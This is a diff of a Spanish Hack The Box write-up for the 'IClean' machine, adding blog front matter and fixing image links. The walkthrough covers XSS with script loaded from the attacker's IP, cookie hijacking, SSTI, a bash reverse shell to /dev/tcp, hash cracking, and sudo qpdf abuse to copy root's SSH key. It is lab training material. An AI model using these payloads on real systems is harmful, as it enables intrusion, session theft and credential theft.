@@ -1,4 +1,22 @@
+---
+layout: single
+title: IClean - Hack The Box
+excerpt: ""
+date: 2024-6-5
+classes: wide
+header:
+  teaser: /assets/images/htb-writeup-iclean/iclean_logo.png
+  teaser_home_page: true
+  icon: /assets/images/hackthebox.webp
+categories:
+  - hackthebox
+tags:
+  - CVE-2021-31630
 
+
+---
+
+![](/assets/images/htb-writeup-iclean/iclean_logo.png)
 # PortScan
 
 ```java
@@ -21,14 +39,16 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 # Sitio Web
-![[Pasted image 20240605163238.png]]
+
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605163238.png)
 
 Vemos un **nav** con su respectivo **Login**, intenté ingresar con credenciales por defecto, incluso llevar a cabo un **STTI** blind ya qué por detrás está corriendo un **python**, entre otras técnicas para poder bypassear o ejecutar código a través del Login con **Burpsuite**, pero no logré nada, seguí indagando en la página principal.
 
-![[Pasted image 20240605163407.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605163407.png)
 
 Vemos que tenemos en la página un apartado para solicitar un presupuesto para la limpieza.
-![[Pasted image 20240605163446.png]]
+
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605163446.png)
 
 Intercepto esta solicitud con **Burpsuite** para llevar a cabo intento de posible falla de seguridad... de primero se me ocurre **STTI**, intenté varias maneras pero no logré nada, seguí intentando...
 
@@ -45,9 +65,9 @@ python3 -m http.server 80
 <script+src%3d"http%3a//10.10.14.x/test"></script>
 ```
 
-![[Pasted image 20240605164714.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605164714.png)
 
-![[Pasted image 20240605164722.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605164722.png)
 
 viendo qué estamos pudiendo llevar a cabo un **XSS**, se me ocurre tratar de robar la cookie de sesión, es decir un **cookie hijacking**, para poder loguearnos en el **Login** que vimos al principios, así que sustituyo el payload por éste:
 ```bash
@@ -55,10 +75,11 @@ viendo qué estamos pudiendo llevar a cabo un **XSS**, se me ocurre tratar de ro
 ```
 
 obteniendo así lo que sería una cookie de sesión:
-![[Pasted image 20240605165222.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605165222.png)
 
 con el nombre de su variable, así que procedo a remplazar esto en mi navegador, en mi caso uso **Firefox**, es tan fácil como ir a la WEB, hacer **CTRL + SHIFT + C**, luego ir a **Storage** > **Cookies** > **+**, y cambiamos los valores tal que así:
-![[Pasted image 20240605165539.png]]
+
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605165539.png)
 
 o también podríamos usar la extensión de navegadores **"cookie-editor"**.
 
@@ -77,32 +98,36 @@ Lamentablemente, al ir a **Login**, recargando no logro nada, pero hago un **fuz
 ```
 
 descubriendo un directorio "**/dashboard**", así que con la cookie seteada procedo a ir a éste directorio...
-![[Pasted image 20240605170417.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605170417.png)
 
 vemos qué estamos ante un **Sistema de factura,** el cual podemos escanear **códigos QR's**, editar servicios, entre otras cosas... me pongo a investigar & probar cosas..
 
 empiezo generando una factura..
-![[Pasted image 20240605171335.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605171335.png)
+
 eso me genera un **ID**, intuyo que este ID lo necesitaremos para algo, sigo indaganado..
-![[Pasted image 20240605171416.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605171416.png)
+
 el **ID** aparentemente es para generar un **QR**, así que lo pongo acá.
-![[Pasted image 20240605171538.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605171538.png)
 
 veo que ahora podemos generar un Escaneable con el link del QR, lo pongo...
-![[Pasted image 20240605171702.png]]
+
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605171702.png)
+
 generándose esto, me da por curiosear aquí ya que veo números para tratar de llevar a cabo un **STTI**, lo intercepto con **BurpSuite**.
 
-![[Pasted image 20240605171802.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605171802.png)
 
 en esa **DATA** pruebo en la variable del **QR** inyectar una operación básica **SSTI**..
-![[Pasted image 20240605172955.png]]
-![[Pasted image 20240605173011.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605172955.png)
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605173011.png)
 
 y estamos llevando a cabo un **STTI** exitosamente, pero lo está convirtiendo en **base64**, ya sabiendo esto podría entablarme una **Reverse Shell** de la siguiente manera:
 
 1. Nos creamos un archivo con nombre "**revshell**", con esto dentro:
 ```bash
-#!/bin/bas
+#!/bin/bash
 bash -c 'bash -i >&/dev/tcp/10.10.14.x/PORT 0>&1'
 ```
 
@@ -122,7 +147,7 @@ nc -nlvp PORT
 
 ```
 
-![[Pasted image 20240605173635.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605173635.png)
 
 logrando acceso a la máquina, sólo quedaría darle [Tratamiento a la TTY]()(https://4uli.github.io/tratamiento-tty/#).
 
@@ -130,32 +155,33 @@ logrando acceso a la máquina, sólo quedaría darle [Tratamiento a la TTY]()(ht
 # Escalada de Privilegios #1 
 
 como **www-data**, miro el directorio Home para ver posibles usuarios, descubriendo así a "**consuela**", indago en el directorio del la app, viendo el **"app.py"** detalladamente descubro esto:
-![[Pasted image 20240605174045.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605174045.png)
 
 descubriendo las credenciales de la **DB** en texto claro, así qué procedo a buscar que puertos que estén en uso que coincidan con lo que usan las DB's por defecto con:
 ```bash
 ss -tulnp
 ```
 
-![[Pasted image 20240605174153.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605174153.png)
 viendo que está abierto el **:3306** que suele ser **MySQL**, así que intento conectarme a **MySQL** en local con estas créndeciales.
 ```bash
 mysql -u iclean -p
 ```
 
-![[Pasted image 20240605174435.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605174435.png)
 
 logrando conectarnos a la base de datos, así que ahora veré las tablas & sus contenidos a ver que encuentro...
-![[Pasted image 20240605174526.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605174526.png)
+
 encontrándome esto en la tabla **"users"** de la db "**capiclean**", las contraseñas pero hasheadas, pruebo en [hashes.com](https://hashes.com/en/decrypt/hash) a ver sí es posible desencriptarla, empecé por la de admin pero no funcionó, así que pruebo con el hash de consuela..
-![[Pasted image 20240605174919.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605174919.png)
 
 logrando desencriptar la contraseña, ahora pruebo estas credenciales para convertirme en "**consuela**", logrando acceso.
 
 # Escalada de Privilegios #2
 
 Como "**consuela**" listo por **SUDOERS**, viendo ésto:
-![[Pasted image 20240605175042.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605175042.png)
 
 qué podemos ejecutar el aparente binario "**qpdf**" como quién queramos, así que es una potencial manera de escalar a **ROOT**, no tengo idea qué es **qpdf** así que hago una investigación en Internet, encontrándome con su [DOCUMENTACIÓN.](https://qpdf.readthedocs.io/en/stable/cli.html#basic-invocation)
 
@@ -165,7 +191,7 @@ sudo /usr/bin/qpdf --empty /tmp/pwned.txt --qdf --add-attachment /root/.ssh/id_r
 ```
 
 crearemos un archivo en el "**tmp**" con la copia de la **id_rsa** de **ROOT**.
-![[Pasted image 20240605180556.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605180556.png)
 
 nos copiamos esta clave en nuestra máquina, dándole permisos "**600**" y podremos conectarnos.
-![[Pasted image 20240605180657.png]]
+![](/assets/images/htb-writeup-iclean/Pasted image 20240605180657.png)
